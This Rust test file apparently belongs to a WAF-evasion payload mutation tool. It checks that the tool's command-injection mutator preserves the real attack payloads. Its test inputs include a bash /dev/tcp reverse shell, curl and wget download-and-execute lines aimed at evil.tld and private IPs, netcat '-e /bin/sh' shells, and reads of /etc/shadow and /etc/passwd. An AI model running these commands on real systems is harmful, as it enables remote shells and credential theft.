//! The command-injection twin of `sql_mutation_preserves_attack` /
//! `xss_mutation_preserves_attack`.
//!
//! `cmd::mutate` correctly transforms the operator's real command in
//! Strategies 1-6 — but its Priority-0 block also emitted FIVE canned
//! bare RCE-confirmation probes (`whoami`, `id`, `hostname`,
//! `uname${IFS}-a`, `/bin/sh${IFS}-c${IFS}id`) that REPLACE the
//! payload, and silently rewrote `/etc/passwd` → `/etc/hostname`. So a
//! reverse shell `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` "mutated"
//! into `whoami` — a different, far weaker payload that pops no shell,
//! exactly the rig the de-rigged bench rejects. And the operator's
//! `/etc/passwd` exfil could never be tested as-written.
//!
//! Proving side: a structured attack (reverse shell / download-exec /
//! specific-file exfil) is NEVER replaced by a bare probe, and its
//! target survives. Adversarial twin: a genuine bare `; whoami` probe
//! STILL gets the equivalent `id`/`hostname` set — those really are
//! semantically interchangeable there, so the gate must not kill them.

use wafrift_grammar::grammar::cmd;

/// The canned bare probes Priority-0 used to substitute wholesale.
const BARE_PROBES: &[&str] = &[
    "whoami",
    "id",
    "hostname",
    "uname${IFS}-a",
    "/bin/sh${IFS}-c${IFS}id",
];

#[test]
fn reverse_shell_is_never_replaced_by_a_bare_probe() {
    let attack = "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
    let variants = cmd::mutate(attack, 64);
    assert!(
        !variants.is_empty(),
        "engine produced zero variants for a real reverse shell"
    );
    for v in &variants {
        assert!(
            !BARE_PROBES.contains(&v.payload.as_str()),
            "reverse shell was REPLACED by canned bare probe {:?} (rules {:?})",
            v.payload,
            v.rules_applied
        );
    }
    // The attack must still be reachable: at least one variant carries
    // the reverse-shell construct AND the attacker endpoint.
    assert!(
        variants
            .iter()
            .any(|v| v.payload.contains("/dev/tcp") && v.payload.contains("10.0.0.1")),
        "no variant preserved the /dev/tcp reverse-shell endpoint"
    );
}

#[test]
fn download_exec_and_file_exfil_keep_their_target() {
    let cases: &[(&str, &str)] = &[
        ("; curl http://evil.tld/s|bash", "evil.tld"),
        ("&& wget http://10.1.1.9/x -O /tmp/x; sh /tmp/x", "10.1.1.9"),
        ("; cat /etc/shadow", "shadow"),
        ("| nc 192.168.9.9 9001 -e /bin/sh", "192.168.9.9"),
    ];
    for (attack, marker) in cases {
        let variants = cmd::mutate(attack, 64);
        assert!(!variants.is_empty(), "no variants for {attack:?}");
        for v in &variants {
            assert!(
                !BARE_PROBES.contains(&v.payload.as_str()),
                "{attack:?} was replaced by canned bare probe {:?}",
                v.payload
            );
        }
        assert!(
            variants.iter().any(|v| v.payload.contains(marker)),
            "no variant of {attack:?} preserved the target {marker:?}"
        );
    }
}

#[test]
fn passwd_target_is_offered_not_silently_rewritten() {
    // The pre-fix engine produced ONLY `/etc/hostname` IFS variants for
    // a `/etc/passwd` read — so against a WAF without a passwd-filename
    // rule the operator's actual attack was never sent.
    let variants = cmd::mutate("; cat /etc/passwd", 64);
    assert!(
        variants.iter().any(|v| v.payload.contains("/etc/passwd")),
        "operator's real /etc/passwd target was never offered (silently rewritten)"
    );
}

#[test]
fn adversarial_twin_bare_probe_still_gets_equivalent_set() {
    // A genuine bare exec probe IS semantically interchangeable with
    // the other bare probes — the gate must not lobotomise that.
    for probe in ["; whoami", "; id"] {
        let variants = cmd::mutate(probe, 40);
        assert!(!variants.is_empty(), "no variants for bare probe {probe:?}");
        assert!(
            variants.iter().any(|v| v.payload == "id"
                || v.payload == "hostname"
                || v.payload.contains("uname")),
            "bare probe {probe:?} lost its equivalent canned-probe set — gate too aggressive"
        );
    }
}

#[test]
fn evade_path_preserves_cmdi() {
    use wafrift_grammar::grammar::{PayloadType, mutate_as};
    let attack = "; nc 10.2.2.2 9001 -e /bin/sh";
    let out = mutate_as(attack, PayloadType::CommandInjection, 80);
    assert!(!out.is_empty());
    for m in &out {
        assert!(
            !BARE_PROBES.contains(&m.payload.as_str()),
            "evade-path replaced the bind/exec attack with canned {:?}",
            m.payload
        );
    }
    assert!(
        out.iter().any(|m| m.payload.contains("10.2.2.2")),
        "evade-path produced no variant carrying the attacker host"
    );
}
